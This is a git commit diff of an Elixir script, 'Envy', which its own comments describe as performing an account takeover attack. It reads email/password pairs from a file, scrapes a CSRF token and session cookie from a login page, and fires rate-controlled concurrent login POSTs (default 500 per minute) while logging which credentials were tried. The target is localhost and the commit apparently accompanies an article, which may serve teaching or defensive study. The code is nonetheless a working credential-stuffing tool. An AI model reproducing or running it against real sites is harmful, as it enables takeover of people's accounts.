8e4cca3dad900d4a272d10766c7cbf927019fe60
dt <98478153+realcorvus@users.noreply.github.com>
2022-07-14 14:27:46 -0400

    for new article

--- do_ato.exs
+++ do_ato.exs
@@ -6,8 +6,8 @@ defmodule EnvyScript do
 
     Example usage, default rate limit (60 requests per minute):
     mix run do_ato.exs credentials_10.txt
-    
-    Example usage, custom rate limit (100 requests per minute): 
+
+    Example usage, custom rate limit (100 requests per minute):
     mix run do_ato.exs credentials_10.txt 100
     """
   end
@@ -16,15 +16,15 @@ defmodule EnvyScript do
     pairs = parse_file(filename)
     Envy.ato(pairs)
   end
-  
+
   def run_ato([filename, rate_limit]) do
     pairs = parse_file(filename)
     irl = String.to_integer(rate_limit)
     Envy.ato(pairs, irl)
   end
-  
+
   def run_ato(_), do: "Error: too many arguments"
-  
+
   def parse_file(filename) do
     filename
     |> File.read!()
--- lib/envy.ex
+++ lib/envy.ex
@@ -1,78 +1,71 @@
 defmodule Envy do
   @url "http://localhost:4000/users/log_in"
-  @headers [{"Content-Type", "application/x-www-form-urlencoded"}]
 
-  # The main function you call to perform an account takeover attack
-  #
-  # login_pairs is a list of tuples, for example:
-  # [{"corvid@example.com", "corvidPass2022"}, ...]
-  # 
-  # requests_per_minute is the limit on how many http requests will be sent
-  # in a 60 second period. Defaults to 60 (one request per second)
-  @spec ato(list(), non_neg_integer()) :: list()
-  def ato(login_pairs, requests_per_minute \\ 60) do
-    do_ato(login_pairs, convert_rpm(requests_per_minute))
-    |> Enum.map(&Task.await/1)
-  end
-  
-  def do_ato([], _sleep), do: []
-  def do_ato([h|t], sleep_n) do
-    Process.sleep(sleep_n)
-    [Task.async(fn -> try_login(h) end) | do_ato(t, sleep_n)]
-  end
-  
-  # Convert requests per minute into milliseconds for Process.sleep()
-  @spec convert_rpm(non_neg_integer()) :: non_neg_integer()
-  def convert_rpm(rpm) do
-    (1000 * (60 / rpm)) |> trunc()
-  end
-
-  def try_login([email, password]) do
-    [user, domain] = String.split(email, "@")
-    try_login(user, domain, password)
-  end
-  
-  def try_login(email_name, email_domain, password) do
-    tc = get_time_cred(email_name, email_domain, password)
-
-    with {:ok, r} <- HTTPoison.get("http://localhost:4000/users/log_in"),
-         {:ok, html} <- Floki.parse_document(r.body)
+  def get_csrf_and_cookie() do
+    with {:ok, r} <- HTTPoison.get(@url),
+         {:ok, html} <- Floki.parse_document(r.body),
+         [{_, [_,_,{_v, csrf_token}], []}] <- Floki.find(html, "[name=_csrf_token")
     do
-      process_response(r, html, email_name, email_domain, password, tc)
+      cookie = get_cookie(r)
+      %{cookie: cookie, csrf_token: csrf_token}
     else
-      _ ->
-        tc <> " error, GET or parsing failed\n"
+      e ->
+        IO.inspect(e)
+        raise "Failed to get CSRF token and cookie"
     end
   end
-  
-  def process_response(r, html, email_name, email_domain, password, tc) do
-    case Floki.find(html, "[name=_csrf_token") do
-      [] ->
-        tc <> " error, no csrf token"
-      [{_, [_,_,{_v, csrf_token}], []}] ->
-        cookie = get_cookie(r)
-        post_body = get_post_body(csrf_token, email_name, email_domain, password)
-        case HTTPoison.post(@url, post_body, @headers, hackney: [cookie: [cookie]]) do
-          {:ok, pr} ->
-            tc <> " Login POST status #{pr.status_code}\n"
-          _ ->
-            tc <> " Login POST failed\n"
-        end
-    end
-  end
-  
-  def get_post_body(csrf_token, email_name, email_domain, password) do
-    "_csrf_token=#{csrf_token}&user%5Bemail%5D=#{email_name}%40#{email_domain}&user%5Bpassword%5D=#{password}&user%5Bremember_me%5D=false"
-  end
-  
+
   def get_cookie(response) do
-    {_, cookie} = 
+    {_, cookie} =
       response.headers
       |> Enum.find(fn {x, _} -> x == "set-cookie" end)
     cookie
   end
-  
-  def get_time_cred(email_name, email_domain, password) do
-    "#{NaiveDateTime.local_now()} #{email_name}@#{email_domain}/#{password} "
+
+  @headers [{"Content-Type", "application/x-www-form-urlencoded"}]
+
+  def send_login(email, password) do
+    cc = get_csrf_and_cookie()
+    body = get_post_body(cc.csrf_token, email, password)
+    tep = get_tep(email, password)
+    case HTTPoison.post(@url, body, @headers, hackney: [cookie: [cc.cookie]]) do
+      {:ok, r} ->
+        tep <> " Login POST status #{r.status_code}\n"
+      _ ->
+        tep <> " Login POST failed\n"
+    end
+  end
+
+  def get_post_body(csrf_token, email, password) do
+    [user, domain] = String.split(email, "@")
+    "_csrf_token=#{csrf_token}&user%5Bemail%5D=#{user}%40#{domain}&user%5Bpassword%5D=#{password}"
+  end
+
+  def get_tep(email, password) do
+    "#{NaiveDateTime.local_now()} #{email}/#{password} "
+  end
+
+  # Convert requests per minute into milliseconds for Process.sleep()
+  def convert_rpm(rpm) do
+    (1000 * (60 / rpm)) |> trunc()
+  end
+
+  # The main function you call to perform an account takeover attack
+  #
+  # login_pairs is a list of lists, for example:
+  # [["corvid@example.com", "corvidPass2022"], ...]
+  #
+  # rpm is the limit on how many http requests will be sent
+  # in a 60 second period. Defaults to 500
+  def ato(login_pairs, rpm \\ 500) do
+    login_pairs
+    |> do_ato(convert_rpm(rpm))
+    |> Enum.map(&Task.await/1)
+  end
+
+  def do_ato([], _sleep), do: []
+  def do_ato([[email, pass]|t], sleep_n) do
+    Process.sleep(sleep_n)
+    [Task.async(fn -> send_login(email, pass) end) | do_ato(t, sleep_n)]
   end
 end
